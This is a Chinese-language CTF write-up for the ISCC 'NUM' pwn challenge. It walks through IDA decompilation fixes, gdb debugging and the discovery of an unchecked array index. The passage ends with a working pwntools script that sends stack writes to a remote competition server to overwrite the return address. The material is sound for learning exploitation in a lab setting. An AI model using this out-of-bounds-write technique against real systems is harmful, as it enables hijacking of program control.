---
title: ISCC-pwn-NUM-wp
date: 2021-05-02 13:06:57
tags:
---



# NUM -wp

学习到的知识点：

> IDA宏定义
>
> IDA中改bug
>
> 数组、switch的伪代码分析



## 反汇编失败--参数不匹配

![](https://i.imgur.com/kdQWRCR.png)



从汇编代码中可以看见scanf的参数是四个，而反汇编那里出来的参数多于四个。	

![](https://i.imgur.com/6WpcZTZ.png)



![](https://i.imgur.com/bU4r5I9.png)

在这里改为四个参数，将后面的参数全部删除。

按'y'键更改。

![](https://i.imgur.com/QFPiGhV.png)



## 读反汇编出的c语言代码

![](https://i.imgur.com/2102GnB.png)

这是一个数组，首地址(&v17),a2是数组的长度。

![](https://i.imgur.com/ZduiP7i.png)

这也是一个char数组的循环赋值



## 多层循环实际上是switch语句



可以看到后面的输入输出语句都是对应着菜单。

漏洞点在输入为3. Change One?，没有对数字进行边界控制，也就是说当我们只有一个a[3]数组，我们可以更改到a[1024]甚至更多。里面的数字就是对应首地址的偏移地址。

![](https://i.imgur.com/tE3n3UI.png)



**假如v17[a2]访问到这里的print函数，并且地址是ret返回地址。我们就获得了程序控制。**



![](https://i.imgur.com/jBqLbfT.png)





## 数组的首地址





![](https://i.imgur.com/56laxlH.png)

![](https://i.imgur.com/Uoe6NQ2.png)

这里创建输入数组数据

在gdb中输入1  1来看是否是数组的首地址。



![](https://i.imgur.com/Ut7Z0eA.png)

在黄色高亮处gdb下断点。



![](https://i.imgur.com/o8mouXN.png)

可以看到EDX是0x1也就是我们输入进去的1

![](https://i.imgur.com/j9lxOiR.png)

## 分析一下scanf()函数

![](https://i.imgur.com/8Ep6fUf.png)

从汇编中可以看到程序通过**scanf**将数据存储到栈中，然后通过**eax和ecx**将数据存储到**eax**中存放的地址中去（cl是ecx的低位）

那意味着在程序运行到**0x08049321**的位置时，此时eax中存放的即时数组的首地址。

![](https://i.imgur.com/q07EHg5.png)



## 找到数组和ret之间的偏移

数组首地址可以从gdb中知道，也就是eax的值。

> 0xffffcf38 数组首地址

而ret的值可以通过不断执行到ret，再查看esp的值从而得知。

> 0xffffcfbc  返回地址

之间的差值是0x84，也就是说数组的首地址再偏移0x84就到了ret的第一个字节。



于是wp如下：



```
#coding:utf8
from pwn import *
context.log_level = 'debug'
process_name = './NUM'
    # p = process(process_name)
p = remote('39.96.88.40',7030)
     
     
hackhere = [0xb2, 0x91, 0x04, 0x08]
write_offset = 0x84
     
def change_number(offset, value):
  p.sendlineafter('5. Exit?', '3')
  p.sendlineafter('Change which?', str(offset))
  p.sendlineafter('New NUM:', str(value))
     
p.sendlineafter('So, how many NUM?', '1')
p.sendlineafter('Send NUM', '1')
p.recv()

for i in range(4):
  change_number(write_offset+i, hackhere[i])
     
p.sendlineafter('5. Exit?', '5')
     
     
p.interactive()
```



> 注意缩进





## 仍有疑惑的点：

> 后面change的循环是怎么赋值的？
>
> 为什么用低一字节的dl传给[eax]?